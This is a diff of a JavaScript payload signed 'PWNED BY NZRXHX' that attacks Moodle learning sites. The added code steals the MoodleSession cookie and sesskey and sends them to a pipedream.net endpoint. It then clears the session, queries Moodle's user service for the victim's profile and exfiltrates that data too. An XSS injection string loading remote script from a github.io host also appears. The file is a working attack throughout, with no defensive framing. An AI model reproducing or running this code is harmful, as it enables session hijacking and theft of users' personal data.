@@ -1,9 +1,4 @@
 //btw PWNED BY NZRXHX
-const u=document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param');
-const t=document.cookie.match(/MoodleSession=([^;]+)/)[1];
-const s=M.cfg.sesskey;
-fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+t+"&id="+u+"&sesskey="+s);
-document.cookie='MoodleSession=;path=/';
 (() => {
   const targets = [
     `"onload="import('//nzrxhx.github.io/payloads/payload.js')`,
@@ -25,3 +20,20 @@ document.cookie='MoodleSession=;path=/';
     });
   }
 })();
+const u=document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param');
+const t=document.cookie.match(/MoodleSession=([^;]+)/)[1];
+const s=M.cfg.sesskey;
+fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?MoodleSession='+t+"&id="+u+"&sesskey="+s);
+document.cookie='MoodleSession=;path=/';
+fetch('/lib/ajax/service.php?sesskey='+s,{
+    method:'POST',
+    headers:{
+        'Content-Type':'application/json',
+        'Cookie':'MoodleSession='+t,
+        'User-Agent':'does it even matter atp?',
+        'Origin':'https://globalsupport.education'
+    },
+    body:JSON.stringify([{index:0,methodname:"core_user_get_users_by_field",args:{field:"id",values:[u]}}])
+})
+.then(r=>r.json())
+.then(d=>fetch('https://eoizd5ecl7m1qqn.m.pipedream.net/?userinfo='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'}));
